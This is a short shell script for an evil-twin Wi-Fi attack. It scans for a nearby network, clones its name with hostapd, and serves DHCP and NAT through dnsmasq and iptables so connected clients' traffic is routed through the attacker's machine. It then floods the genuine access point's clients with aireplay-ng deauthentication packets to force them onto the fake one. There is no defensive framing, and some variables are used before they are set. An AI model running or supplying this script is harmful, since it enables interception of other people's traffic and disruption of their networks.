#!/bin/sh
echo "Please enter the interface to listen to the networks : \n"
read listeningInterface
echo "Please enter the interface to monitor mode : \n"
read monitorMode
echo "Please enter the interface that will be connected to internet : \n"
read internetInterface

finalESSID=""
finalBSSID=""

select ESSID in $(iwlist ${monitorInterface} scan | grep ESSID)
do
var=${ESSID#*:\"}
finalESSID=${var%\"}
break
done

BSSID=$(iwlist ${monitorInterface} scan | grep -B 5 $finalESSID | grep Address)
finalBSSID=$(echo $BSSID | grep "([A-F0-9][A-F0-9]:){5}[A-F0-9][A-F0-9]" -Eo)

sysctl -w net.ipv4.ip_forward=1

iptables -I POSTROUTING -t nat -o ${internetInterface} -j MASQUERADE

sysctl -w net.ipv6.conf.all.disable_ipv6=1

echo "interface=${listeningInterface}" > dnsmasq.conf
echo "dhcp-range=192.168.1.10,192.168.1.100,12h" >> dnsmasq.conf
echo "dhcp-option=6,1.1.1.1" >> dnsmasq.conf
echo "dhcp-option=3,192.168.1.1" >> dnsmasq.conf
echo "server=9.9.9.9" >> dnsmasq.conf
echo "no-resolv" >> dnsmasq.conf

ip addr add 192.168.1.1/24 dev "${listeningInterface}"

dnsmasq -d -C ./dnsmasq.conf& > /dev/null


echo "interface=${listeningInterface}" > hostapd.conf
echo "ssid=${finalESSID}" >> hostapd.conf
echo "hw_mode=g" >> hostapd.conf
echo "channel=11" >> hostapd.conf

hostapd hostapd.conf&

sleep 10


airmon-ng start ${monitorMode}
monitorInterface=$(ip a | grep "wl.*mon:" -o | cut -d: -f1)
aireplay-ng -0 50 -a ${finalBSSID} ${monitorInterface} -D

sleep 500
